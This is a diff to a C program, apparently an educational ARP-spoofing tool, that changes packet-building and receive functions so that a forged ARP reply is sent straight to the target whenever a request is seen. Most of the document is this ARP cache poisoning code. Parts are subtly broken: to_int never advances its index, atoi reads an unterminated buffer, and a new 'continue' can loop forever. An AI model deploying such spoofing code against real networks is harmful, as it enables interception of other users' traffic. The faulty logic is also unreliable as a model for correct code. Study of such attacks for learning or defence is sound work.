@@ -22,7 +22,7 @@ void    get_interface_enabled(struct malcolm *arp) {
     freeifaddrs(ifa);
 }
 
-bool check_ip_argument(struct malcolm arp, char *ip, int *iffindex) {
+bool check_ip_argument(struct malcolm arp, unsigned char *ip, int *iffindex) {
 
     int i = 0;
     int ifindex = 0;
@@ -31,7 +31,9 @@ bool check_ip_argument(struct malcolm arp, char *ip, int *iffindex) {
     while (arp.interface[i]) 
     {
         ipt = get_ip_address(arp.interface[i], &ifindex);
-        if (strcmp(ipt, ip) == 0) {
+        if (!ipt)
+            continue ;
+        if (strcmp(ipt, (char *)ip) == 0) {
             *iffindex = ifindex;
             return (true);
         }
@@ -40,7 +42,7 @@ bool check_ip_argument(struct malcolm arp, char *ip, int *iffindex) {
     return (false);
 }
 
-bool compare_mac(char *mac, char *hexa, int k) {
+bool compare_mac(unsigned char *mac, char *hexa, int k) {
 
     //if (hexa[k] == ':')
     //    k++;
@@ -51,7 +53,7 @@ bool compare_mac(char *mac, char *hexa, int k) {
     return (false);
 }
 
-bool check_mac_address(struct malcolm arp, char *mac) {
+bool check_mac_address(struct malcolm arp, unsigned char *mac) {
 
     int i = 0, j = 0, hex = 0, k = 0;
     //char hexa[2];
@@ -88,7 +90,26 @@ bool check_mac_address(struct malcolm arp, char *mac) {
     return (true);
 }
 
-void    send_arp(struct malcolm arp) {
+void    to_int(struct malcolm *arp) {
+
+    unsigned char tab[3];
+
+    for (int i = 0, j = 0; arp->source.ip[i]; i++) {
+        if (arp->source.ip[i] != '.' || arp->source.ip[i + 1] != '.') {
+            printf("source[%d]\n", arp->source.ip[i]);
+            tab[0] = arp->source.ip[i];
+            tab[1] = arp->source.ip[i + 1];
+            printf("source[%d] [%d]\n", tab[0], tab[1]);
+            arp->source.int_ip[j] = atoi((const char*)tab);
+            printf("int = %d", arp->source.int_ip[j]);
+        }
+    }
+    for (int i = 0; i < SIZE_IPV4_ADDRESS; i++) {
+        printf("tab[%d] = %d\n", i, arp->source.int_ip[i]);
+    }
+}
+
+void    send_arp(struct malcolm *arp) {
 
     // init struct sockaddr_ll
     struct sockaddr_ll  sockaddr;
@@ -105,7 +126,7 @@ void    send_arp(struct malcolm arp) {
 
     memset(&sockaddr, 0, sizeof(struct sockaddr_ll));
     sockaddr.sll_family = AF_PACKET;
-    sockaddr.sll_ifindex = arp.interfaceidx;
+    sockaddr.sll_ifindex = arp->interfaceidx;
     if (bind(fd, (struct sockaddr*)&sockaddr, sizeof(struct sockaddr_ll)) < 0) {
         printf("Error bind\n");
         return ;
@@ -116,7 +137,7 @@ void    send_arp(struct malcolm arp) {
     arphdr = (struct arpHdr *)(buffer + 14); // size header = 42 -> size arp packet
     sockaddr.sll_family = AF_PACKET;
     sockaddr.sll_protocol = htons(ETH_P_ARP); // 0x0806 for ARP protocol
-    sockaddr.sll_ifindex = arp.interfaceidx;
+    sockaddr.sll_ifindex = arp->interfaceidx;
     sockaddr.sll_hatype = htons(ARPHRD_ETHER);
     sockaddr.sll_pkttype = PACKET_BROADCAST;
     sockaddr.sll_halen = SIZE_MAC_ADDRESS;
@@ -124,29 +145,19 @@ void    send_arp(struct malcolm arp) {
     sockaddr.sll_addr[7] = 0x00;
 
     //  set header ethernet header
-    memset(ethhdr->h_dest, 0xff, SIZE_MAC_ADDRESS);
-    // test
-    //memcpy(ethhdr->h_dest, arp.source.mac, SIZE_MAC_ADDRESS);
-    memcpy(ethhdr->h_source, arp.source.mac, SIZE_MAC_ADDRESS);
+    //memset(ethhdr->h_dest, 0xff, SIZE_MAC_ADDRESS);
+    memcpy(ethhdr->h_dest, arp->target.mac, SIZE_MAC_ADDRESS);    
+    
+    memcpy(ethhdr->h_source, arp->source.mac, SIZE_MAC_ADDRESS);
 
     // set header arp mac
-    memcpy(arphdr->__ar_sha, arp.source.mac, SIZE_MAC_ADDRESS);
+    memcpy(arphdr->__ar_sha, arp->source.mac, SIZE_MAC_ADDRESS);
 
-    memcpy(sockaddr.sll_addr, arp.source.mac, SIZE_MAC_ADDRESS);
+    memcpy(sockaddr.sll_addr, arp->source.mac, SIZE_MAC_ADDRESS);
     
-    // TEST
-    memcpy(arphdr->__ar_tha, arp.source.mac, SIZE_MAC_ADDRESS);
+    // TEST -> target mac = attack mac
+    memcpy(arphdr->__ar_tha, arp->source.mac, SIZE_MAC_ADDRESS);
     
-    print_mac("destt", (unsigned char *)arp.target.mac);
-    print_mac("sourcee", (unsigned char *)arp.source.mac);
-
-
-    print_mac("dest", ethhdr->h_dest);
-    print_mac("source", ethhdr->h_source);
-    print_mac("header", arphdr->__ar_sha);
-    print_mac("source", sockaddr.sll_addr);
-
-
     ethhdr->h_proto = htons(ETH_P_ARP); // 0x0806 ARP protocol 
 
     // set header arp 
@@ -156,8 +167,8 @@ void    send_arp(struct malcolm arp) {
     arphdr->ar_pln = SIZE_IPV4_ADDRESS;
     arphdr->ar_op = ARPOP_REPLY; // reply arp
 
-    memcpy(arphdr->__ar_sip, arp.source.ip, SIZE_IPV4_ADDRESS); // source ip
-    memcpy(arphdr->__ar_tip, arp.target.ip, SIZE_IPV4_ADDRESS); // target ip
+    memcpy(arphdr->__ar_sip, arp->source.ip, SIZE_IPV4_ADDRESS); // source ip
+    memcpy(arphdr->__ar_tip, arp->target.ip, SIZE_IPV4_ADDRESS); // target ip
 
     // send arp packet with sockaddr_ll
     int ret = sendto(fd, buffer, SIZE_ARP, 0, (struct sockaddr *)&sockaddr, sizeof(sockaddr));
@@ -168,7 +179,7 @@ void    send_arp(struct malcolm arp) {
     printf("SEND\n");
 }
 
-void    receive_arp(struct malcolm arp) {
+void    receive_arp(struct malcolm *arp) {
 
     (void)arp;
     ssize_t data_size = 0;
@@ -219,7 +230,8 @@ void    receive_arp(struct malcolm arp) {
                 print_mac("source", arphdr->__ar_tha);
                 print_ip("target", arphdr->__ar_sip);
                 print_mac("target", arphdr->__ar_tha);
-    
+                send_arp(arp);
+
             }
         }
     }
@@ -241,7 +253,7 @@ int main(int argc, char **argv) {
 
     bool source = check_ip_argument(arp, arp.source.ip, &arp.interfaceidx);
     bool target = check_ip_argument(arp, arp.target.ip, &arp.interfaceidx);
-
+    to_int(&arp);
     (void)source;
     (void)target;
     //check_mac_address(arp, arp.source.mac);
@@ -250,7 +262,7 @@ int main(int argc, char **argv) {
         printf("IP or mac error\n");
         return (1);
     }*/
-    receive_arp(arp);
+    receive_arp(&arp);
     /*for (int i = 0; arp.interface[i]; i++) {
         printf("interface = %s\n", arp.interface[i]);
         unsigned char *str = get_mac_address(arp.interface[i]);
